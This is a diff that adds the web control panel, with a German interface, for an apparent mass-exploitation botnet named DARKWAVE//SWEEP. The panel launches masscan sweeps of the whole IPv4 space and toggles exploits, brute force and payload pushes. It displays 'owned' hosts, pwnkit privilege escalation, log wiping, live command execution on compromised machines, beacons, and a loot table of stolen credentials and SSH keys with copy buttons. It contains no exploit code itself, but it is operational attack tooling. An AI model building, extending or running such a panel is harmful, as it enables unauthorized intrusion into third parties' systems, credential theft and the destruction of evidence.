@@ -1,0 +1,198 @@
+<!doctype html><html><head><meta charset="utf-8"><title>DW//SWEEP</title>
+<style>
+:root{--g:#3bff57;--a:#00ffd0;--dim:#3bff5766;--bg:#03060a;--pnl:#050f0b}
+*{box-sizing:border-box}
+html,body{height:100%;margin:0}
+body{background:var(--bg);color:var(--g);font:11px/1.4 "SF Mono",Menlo,monospace;display:flex;flex-direction:column;overflow:hidden;height:100dvh}
+#mx{position:fixed;inset:0;opacity:.16;pointer-events:none;z-index:0}
+body:after{content:"";position:fixed;inset:0;background:radial-gradient(ellipse at 50% 0,#0b2e1a55,transparent 60%),repeating-linear-gradient(0deg,#3bff570a 0 1px,transparent 1px 3px);pointer-events:none;z-index:9}
+header{display:flex;align-items:center;gap:10px;padding:6px 12px;border-bottom:1px solid var(--dim);background:#04100be0;position:relative;z-index:2}
+h1{margin:0;font-size:14px;letter-spacing:5px;color:var(--g);text-shadow:0 0 12px #3bff5788}
+h1 span{color:#fff;animation:g 3s infinite}
+@keyframes g{0%,92%,100%{opacity:1}93%{opacity:.2;transform:translateX(-1px)}95%{opacity:1;transform:translateX(2px)}}
+.meta{margin-left:auto;display:flex;gap:8px;align-items:center;color:var(--dim);font-size:9px}
+.led{width:8px;height:8px;border-radius:50%;background:#444}.led.on{background:var(--g);box-shadow:0 0 12px var(--g);animation:p 1s infinite}
+@keyframes p{50%{opacity:.3}}
+.btn{background:#03130c;border:1px solid var(--dim);color:var(--g);padding:4px 8px;font:inherit;cursor:pointer;letter-spacing:1px}
+.btn:hover{border-color:var(--g);box-shadow:0 0 10px #3bff5740}.btn.stop{color:#ff5f5f;border-color:#ff5f5f66}
+main{display:flex;gap:8px;padding:6px 12px;align-items:center;position:relative;z-index:2}
+.card{border:1px solid var(--dim);background:var(--pnl);padding:3px 8px;min-width:66px;position:relative}
+.card .k{color:var(--dim);font-size:7.5px;letter-spacing:1.5px;text-transform:uppercase}
+.card .v{font-size:15px}.card.hit .v{color:#fff;text-shadow:0 0 12px var(--g)}
+.prog{flex:1;border:1px solid var(--dim);height:14px;position:relative;background:#020805;overflow:hidden}
+.prog .bar{height:100%;background:repeating-linear-gradient(90deg,var(--g) 0 6px,#0f7a26 6px 8px);width:0;transition:width .5s;box-shadow:0 0 16px #3bff5766}
+.prog .lbl{position:absolute;inset:0;display:grid;place-items:center;font-size:8.5px;letter-spacing:2px;color:#eafff0}
+.cols{display:flex;gap:8px;padding:0 12px 8px;flex:1 1 auto;min-height:0;overflow:hidden;position:relative;z-index:2}
+.pane{border:1px solid var(--dim);background:linear-gradient(180deg,#06141055,#030805);display:flex;flex-direction:column;min-height:0;overflow:hidden;position:relative}
+.pane:before,.pane:after{content:"+";position:absolute;color:var(--dim);font-size:12px}
+.pane:before{top:0;left:2px}.pane:after{bottom:0;right:3px}
+.pane h2{margin:0;padding:5px 9px;font-size:8.5px;letter-spacing:2px;color:var(--a);border-bottom:1px solid var(--dim);flex:0 0 auto;background:#04120c}
+.pane.exp{flex:2.5}.pane.disc{flex:1}.pane.loot{flex:1.55}
+.pane.loot .scroll{min-height:0}
+.scroll{overflow-y:auto;overflow-x:hidden;flex:1 1 auto;min-height:0;padding:5px 8px;scrollbar-width:thin}
+.scroll::-webkit-scrollbar{width:6px}.scroll::-webkit-scrollbar-thumb{background:#13702c}
+.feed div{white-space:pre-wrap;word-break:break-word;border-left:2px solid transparent;padding:2px 0 2px 5px;color:#9dffb2;font-size:10px;border-bottom:1px dotted #3bff5712}
+.feed div:last-child{animation:inn .5s}
+@keyframes inn{from{background:#3bff5718}}
+.t{color:#3bff5740}
+.a-rce_ok,.a-opened,.a-owned,.a-hidden_root,.a-pwnkit,.a-sudo-uid,.a-exploited{color:#fff;font-weight:700;text-shadow:0 0 10px var(--g)}
+.a-rce_fail,.a-no-channel{color:#6f8a56}.a-try{color:#c8ff8a}
+.a-logs_wiped,.a-patched{color:var(--a)}
+.hd{color:#3bff57aa;font-size:9px;border-left:2px solid #3bff5730;padding:1px 0 1px 5px;margin-top:1px}
+.reqline{color:#ffe66d}.resline{color:#8fd0ff}
+table{width:100%;border-collapse:collapse;font-size:9px}th,td{text-align:left;padding:2px 3px;border-bottom:1px solid #3bff5714;vertical-align:top}
+th{color:var(--dim);font-weight:400;position:sticky;top:0;background:#04120c}
+td.ip{color:#fff}code{color:#b8ffc4;cursor:pointer}code:hover{background:#3bff5722}
+.pill{font-size:8px;border:1px solid #3bff5744;padding:0 3px;color:var(--dim)}.pill.ok{color:var(--g);border-color:var(--g)}.pill.no{color:#ff8080;border-color:#ff808066}
+footer{padding:3px 12px;color:#3bff5740;font-size:8.5px;position:relative;z-index:2}
+.blink{animation:b 1s steps(2) infinite}@keyframes b{50%{opacity:0}}
+#flash{position:fixed;inset:0;background:#3bff5710;opacity:0;pointer-events:none;z-index:20}
+#flash.on{animation:f .7s}@keyframes f{0%{opacity:.9}100%{opacity:0}}
+#cfg{position:fixed;inset:0;background:#020604f2;z-index:50;display:none;overflow:auto;padding:24px}
+#cfg.on{display:block}#cfg .box{max-width:720px;margin:0 auto;border:1px solid var(--dim);background:var(--pnl);padding:18px}
+#cfg h3{margin:0 0 10px;letter-spacing:3px;font-size:13px;color:var(--g)}
+#cfg label{display:block;color:var(--dim);font-size:10px;letter-spacing:1px;margin:12px 0 3px}
+#cfg input,#cfg select{width:100%;background:#020604;border:1px solid var(--dim);color:#bfffc0;font:inherit;padding:5px}
+#cfg .row{display:flex;gap:8px}#cfg .row>*{flex:1}
+.chk{display:flex;gap:18px;margin-top:6px}.chk label{display:flex;gap:5px;align-items:center;margin:0;color:#bfffc0}
+.chk input{width:auto}
+#tbar{display:flex;gap:8px;align-items:center;padding:5px 12px;border-bottom:1px solid var(--dim);position:relative;z-index:3;background:#04100b}
+#tbar select,#tbar input{background:#020604;border:1px solid var(--dim);color:#bfffc0;font:inherit;padding:3px}
+#tbar .lbl{color:var(--dim);font-size:9px;letter-spacing:1px}
+#tbar label{display:flex;gap:4px;align-items:center;color:#9dffb2;font-size:10px}
+#tbar input[type=checkbox]{width:auto}
+</style></head><body>
+<canvas id="mx"></canvas><div id="flash"></div>
+<header><button class="btn" onclick="cfgOpen()">CONFIG</button>
+<h1>DARKWAVE<span>//</span>SWEEP</h1>
+<div class="meta"><span id="run">run: -</span><span id="st">boot</span><span class="led" id="led"></span>
+<button class="btn" onclick="ctl('start')">[ START ]</button><button class="btn stop" onclick="ctl('stop')">[ STOP ]</button>
+<button class="btn" onclick="if(confirm('reset?'))ctl('reset')">[ RESET ]</button><button class="btn" onclick="location='/stalker'">[ STALKER ]</button><a class="btn" href="#" onclick="window.open('//'+location.hostname+':8787');return false">[ ARTEX ]</a><button class="btn" onclick="location='/logout'">[ EXIT ]</button></div></header>
+<div id="tbar">
+ <span class="lbl">MODUS</span>
+ <select id="q_mode"><option value="stalker">nur stalker</option><option value="full">alles + exploit</option></select>
+ <span class="lbl">RANGE</span><input id="q_ranges" placeholder="13,23,34 / 100-130" style="width:200px">
+ <span class="lbl">PORTS</span>
+ <select id="q_ports"><option value="80,8080,8081,8443,8090,8880,25461">stalker</option>
+ <option value="80,443,8080,8443">web</option><option value="80,443,21,22,25,3306,5432,6379,8080,8443,9200,27017">web+db</option></select>
+ <label><input id="q_exploit" type="checkbox"> EXP</label>
+ <label><input id="q_brute" type="checkbox"> BRUTE</label>
+ <label><input id="q_artex" type="checkbox"> ARTEX</label>
+ <button class="btn" onclick="qSave()">ANWENDEN</button><span id="q_msg" style="color:#ffd23b"></span>
+</div>
+<main>
+<div class="card"><div class="k">scanned</div><div class="v" id="v-scan">0</div></div>
+<div class="card"><div class="k">open</div><div class="v" id="v-open">0</div></div>
+<div class="card"><div class="k">php</div><div class="v" id="v-php">0</div></div>
+<div class="card hit"><div class="k">owned</div><div class="v" id="v-own">0</div></div>
+<div class="card" style="min-width:190px"><div class="k">zuletzt</div><div class="v" style="font-size:10px" id="v-last">-</div></div>
+<div class="card"><div class="k">queue</div><div class="v" id="v-q">0</div></div>
+<div class="card"><div class="k">pps/t</div><div class="v" id="v-pps">0</div></div>
+<div class="card"><div class="k">block</div><div class="v" id="v-blk">0</div></div>
+<div class="prog"><div class="bar" id="bar"></div><div class="lbl" id="plbl">0 %</div></div>
+</main>
+<div class="cols">
+<section class="pane exp"><h2>// EXPLOIT — TOOL-/REQUEST-LOG <span class="blink">█</span></h2><div class="scroll feed" id="exp"></div></section>
+<section class="pane disc"><h2>// TOOLS · NUCLEI</h2><div class="scroll feed" id="nuc"></div><h2>// ERRORS</h2><div class="scroll feed" id="errs" style="max-height:24%"></div><h2>// STALKER-PORTALE <span class="blink">_</span></h2><div class="scroll feed" id="stk" style="max-height:26%"></div><h2>// COVERAGE · PORTS</h2><div class="scroll feed" id="cov" style="max-height:46%"></div></section>
+<section class="pane loot"><h2>// LOOT <a class="btn" href="/api/loot.txt" style="font-size:8px;padding:1px 5px">TXT</a> <a class="btn" href="/api/loot.jsonl" style="font-size:8px;padding:1px 5px">JSON</a></h2><div class="scroll" style="flex:2 1 0"><table><thead><tr><th>ip / zugang</th><th>info</th><th>p</th><th>l</th></tr></thead><tbody id="loot"></tbody></table></div>
+<h2>// EXEC · live <span style="color:#3bff5766">(cmd → antwort)</span></h2><div class="scroll feed" id="cmd" style="flex:1.4 1 0;min-height:150px;background:#020805"></div>
+<h2>// BEACONS</h2><div class="scroll feed" id="bc" style="flex:.5 1 0"></div></section>
+</div>
+<footer>masscan · 13 vektoren · pwnkit · loot · patch · logwipe &nbsp;|&nbsp; code klick = kopieren</footer>
+<script>
+const $=id=>document.getElementById(id),fmt=n=>Number(n||0).toLocaleString('de-DE');
+const esc=s=>(s==null?'':String(s)).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+const dur=s=>{s=+s||0;const h=Math.floor(s/3600),m=Math.floor(s%3600/60);return h?h+'h':m+'m'};
+async function ctl(a){await fetch('/api/control',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a})})}
+let lastOwn=0;
+let ES;function sse(){ES=new EventSource('/events');ES.onmessage=e=>{
+ const d=JSON.parse(e.data),s=d.state||{};
+ $('v-scan').textContent=fmt(s.scanned);$('v-open').textContent=fmt(s.open);$('v-php').textContent=fmt(s.php);
+ $('v-own').textContent=fmt(s.owned);$('v-last').textContent=(s.last_verdict||'-')+' '+(s.last_host||'');$('v-q').textContent=fmt(s.queue);$('v-pps').textContent=(s.pps||0)+'/'+dur(s.elapsed);$('v-blk').textContent=fmt(s.blocks_done)+'/'+fmt(s.blocks_total);
+ $('run').textContent='run: '+(s.run||'-');$('st').textContent=(s.status||'boot').toUpperCase();$('led').className='led'+(s.status==='running'?' on':'');
+ const pct=Math.max(0,Math.min(100,+(s.pct||0)));$('bar').style.width=pct.toFixed(3)+'%';$('plbl').textContent=pct.toFixed(4)+' % von 0.0.0.0/0';
+ if((s.owned||0)>lastOwn){lastOwn=s.owned||0;const f=$('flash');f.className='';void f.offsetWidth;f.className='on';}
+ const key=x=>x.ts+'|'+x.action+'|'+(x.target||'')+'|'+(x.cmd||'')+'|'+(x.vector||'');
+const merge=(buf,arr)=>{const seen=new Set(buf.map(key));for(const l of arr){try{const r=JSON.parse(l);if(!seen.has(key(r))){buf.push(r);seen.add(key(r))}}catch(_){}}if(buf.length>900)buf.splice(0,buf.length-900);return buf};
+window.B={exp:[],disc:[],nuc:[]};
+const all=(d.audit||[]).slice();
+merge(B.exp, all.filter(l=>/"(exploit|vector|privesc|provision|stealth|masscan|host|open|harvest)"/.test(l)));
+merge(B.disc, all.filter(l=>/"(discovery|fingerprint|coverage)"/.test(l)));
+merge(B.nuc, d.nuclei||[]);
+ $('exp').innerHTML=B.exp.slice().reverse().map(r=>{try{
+  const cls=r.action==='rce_fail'?'rce_fail':r.action==='try'?'try':r.action;
+  return `<div class="a-${esc(cls)}"><span class="t">${esc((r.ts||'').slice(11,19))}</span> ${esc(r.action).toUpperCase()} ${r.vector?('['+esc(r.vector)+']'):''} ${esc(r.target||'')} ${r.status?('<span class="resline">HTTP '+r.status+' · '+(r.bytes||0)+'B</span>'):''}${r.error?(' · '+esc(r.error)):''}${r.cmd?`<div class="hd reqline">$ ${esc(String(r.cmd).slice(0,400))}</div>`:''}${r.head?`<div class="hd resline">&lt; ${esc(String(r.head).slice(0,500))}</div>`:''}${r.creds?`<div class="hd reqline">cred: ${esc(r.creds)} <button class="btn" style="font-size:8px;padding:0 4px" onclick="navigator.clipboard.writeText('${esc(r.creds)}')">COPY</button></div>`:''}${r.keys?`<div class="hd">keys: ${esc(r.keys)} <button class="btn" style="font-size:8px;padding:0 4px" onclick="navigator.clipboard.writeText('${esc(r.keys)}')">COPY</button></div>`:''}</div>`}catch(_){return ''}}).join('');
+ const nf=B.nuc.map(l=>{try{const r=JSON.parse(l);return `<div class="a-rce_ok">${esc(r.info?.severity||'').toUpperCase()} ${esc(r.info?.name||r.templateID||'')} ${esc(r.host||'')}</div>`}catch(_){return ''}}).join('');
+ const nl=(d.nlog||[]).slice().reverse().map(x=>`<div><span class="t">${esc(String(x).slice(11,19))}</span> ${esc(String(x).slice(20,120))}</div>`).join('');
+ $('nuc').innerHTML=nf+nl+(!nf&&!nl?'<div style="color:#3bff5755">nuclei wartet auf ziele …</div>':'');
+ const blk=((d.cov&&d.cov.length)?d.cov[d.cov.length-1]:'-');
+ const pv=Math.max(0,Math.min(100,+(s.pct||0)));
+ $('cov').innerHTML=`<div>block: <b>${esc(blk)}</b></div><div>${pv.toFixed(3)}% · ${fmt(s.blocks_done)}/${fmt(s.blocks_total)} blöcke</div><div>ports: ${esc(s.ports||'')}</div>`+ (d.open||[]).slice().reverse().map(l=>{try{const r=JSON.parse(l);return `<div><span class="t">open</span> ${esc(r.target||'')}</div>`}catch(_){return ''}}).join('');
+ const ce=$('cmd');const atBot=ce.scrollHeight-ce.scrollTop-ce.clientHeight<40;
+ ce.innerHTML=(d.cmds||[]).map(l=>{try{const r=JSON.parse(l);if(r.action==='cmd_res')return `<div class="resline">↳ ${r.status?('['+r.status+'] '):''}${esc(String(r.head||'').slice(0,180))}</div>`;return `<div class="reqline"><span class="t">${esc((r.ts||'').slice(11,19))}</span> [${esc(r.actor)}] ${esc((r.cmd||'').slice(0,200))}</div>`}catch(_){return ''}}).join('');
+ if(atBot) ce.scrollTop=ce.scrollHeight;
+ $('bc').innerHTML=(d.beacons||[]).map(b=>`<div><span class="t">${esc(b[0])}</span> ${esc(b[1])}</div>`).join('');
+ $('loot').innerHTML=(d.loot||[]).slice().reverse().map(l=>{try{const r=JSON.parse(l),i=r.info||{};
+  const blob=r.ssh?esc(r.ssh):(esc(r.user)+'@'+esc(r.ip)+' '+esc(r.pass));const link=/^https?:/.test(r.url||'')?r.url:'http://'+esc(r.ip);
+ return `<tr><td class="ip">${esc(r.ip)}${r.port?(':'+esc(r.port)):''}<br><code>${esc(r.ssh||r.user)}</code> <small>${esc(r.pass)}</small><br>
+ <button class="btn" style="font-size:8px;padding:1px 4px" onclick="navigator.clipboard.writeText(blob);this.textContent='ok!'">COPY</button>
+ <a class="btn" style="font-size:8px;padding:1px 4px" href="${link}" target="_blank">LINK</a>
+ <span class="pill">${esc(r.kind||'')}</span></td><td>${esc(i.os||'')} ${esc(i.cores||'')}c ${esc(i.rammb||'')}MB ${esc(i.disk||'')}<br>${esc(i.gpu||'')}${i.keycheck?Object.entries(i.keycheck).map(([k,v])=>` <span class="pill ${v==='green'?'ok':'no'}">${esc(k)}:${v==='green'?'OK':'FAIL'}</span>`).join(''):''}</td><td><span class="pill ${r.patched?'ok':'no'}">${r.patched?'zu':'!'}</span></td><td><span class="pill ${r.cleaned?'ok':'no'}">${r.cleaned?'c':'-'}</span></td></tr>`}catch(_){return ''}}).join('');
+}
+// matrix
+const cv=$('mx'),cx=cv.getContext('2d');let cols,drops;
+function rs(){cv.width=innerWidth;cv.height=innerHeight;cols=(cv.width/14)|0;drops=Array(cols).fill(1)}
+rs();addEventListener('resize',rs);
+const chrs='01アイウエオカキクケコサシスセソ$#%&';
+setInterval(()=>{cx.fillStyle='rgba(3,6,10,.12)';cx.fillRect(0,0,cv.width,cv.height);cx.fillStyle='#3bff57';cx.font='12px monospace';
+ for(let i=0;i<cols;i++){cx.fillText(chrs[(Math.random()*chrs.length)|0],i*14,drops[i]*14);if(drops[i]*14>cv.height&&Math.random()>.975)drops[i]=0;drops[i]++}},70);
+ES.onerror=()=>{ES.close();setTimeout(sse,3000)};}sse();
+</script>
+<div id="cfg"><div class="box">
+<h3>▌ SCAN CONFIG</h3>
+<label>MODUS</label>
+<select id="c_mode"><option value="stalker">nur Stalker-Portale</option><option value="full">voll (Exploits/Vektoren)</option></select>
+<label>RANGES (A-Blöcke, Komma)</label><input id="c_ranges" placeholder="13,23,34">
+<div class="row"><div><label>VON</label><input id="c_from" placeholder="100"></div>
+<div><label>BIS</label><input id="c_to" placeholder="130"></div>
+<div style="flex:0 0 120px"><label>&nbsp;</label><button class="btn" onclick="cfgRange()" style="width:100%">SETZEN</button></div></div>
+<label>PORTS</label>
+<select id="c_preset" onchange="c_preset.value!=='custom'&&(c_ports.value=c_preset.value)">
+<option value="80,8080,8081,8443,8090,8880,25461">stalker</option>
+<option value="80,443,8080,8443">web klein</option>
+<option value="80,443,21,22,25,3306,5432,6379,8080,8443,9200,27017">web + db</option>
+<option value="custom">eigene…</option></select>
+<input id="c_ports" placeholder="80,8080" style="margin-top:5px">
+<div class="row"><div><label>RATE</label><input id="c_rate" type="number" value="8000"></div>
+<div><label>WORKER</label><input id="c_workers" type="number" value="100"></div></div>
+<div class="chk"><label><input id="c_exploit" type="checkbox"> exploits</label>
+<label><input id="c_brute" type="checkbox"> brute force</label>
+<label><input id="c_artex" type="checkbox"> artex push</label>
+<label><input id="c_restart" type="checkbox" checked> neustart</label></div>
+<div style="margin-top:14px;display:flex;gap:10px"><button class="btn" onclick="cfgSave()">SPEICHERN</button>
+<button class="btn" onclick="cfg.classList.remove('on')">ZU</button><span id="c_msg" style="color:#ffd23b"></span></div>
+</div></div>
+<script>
+const cfg=document.getElementById('cfg');
+async function qLoad(){const c=await (await fetch('/api/config')).json();
+ q_mode.value=c.mode||'stalker';q_ranges.value=c.ranges||'';if(c.ports)q_ports.value=c.ports;
+ q_exploit.checked=!!c.exploit;q_brute.checked=!!c.brute;q_artex.checked=!!c.artex;}
+async function qSave(){let r=q_ranges.value.trim();
+ if(/^\d+-\d+$/.test(r)){const[a,b]=r.split('-').map(Number);const o=[];for(let i=a;i<=b;i++)o.push(i);r=o.join(',')}
+ const body={mode:q_mode.value,ranges:r.replace(/\s/g,''),ports:q_ports.value,rate:8000,workers:100,
+ exploit:q_exploit.checked,brute:q_brute.checked,artex:q_artex.checked,restart:true};
+ const x=await fetch('/api/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+ document.getElementById('q_msg').textContent=x.ok?'läuft neu':'fehler';}
+qLoad();
+async function cfgOpen(){cfg.classList.add('on');
+ const c=await (await fetch('/api/config')).json();c_mode.value=c.mode||'stalker';
+ c_ranges.value=c.ranges||'';c_ports.value=c.ports||'';c_rate.value=c.rate;c_workers.value=c.workers;
+ c_exploit.checked=!!c.exploit;c_brute.checked=!!c.brute;c_artex.checked=!!c.artex;c_restart.checked=true;}
+function cfgRange(){const a=+c_from.value,b=+c_to.value;if(!a||!b||b<a)return;const o=[];for(let i=a;i<=b;i++)o.push(i);c_ranges.value=o.join(',')}
+async function cfgSave(){const body={mode:c_mode.value,ranges:c_ranges.value.replace(/\s/g,''),ports:c_ports.value,
+ rate:+c_rate.value,workers:+c_workers.value,exploit:c_exploit.checked,brute:c_brute.checked,
+ artex:c_artex.checked,restart:c_restart.checked};
+ const r=await fetch('/api/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+ document.getElementById('c_msg').textContent=r.ok?'gespeichert':'fehler';}
+</script>
+</body></html>
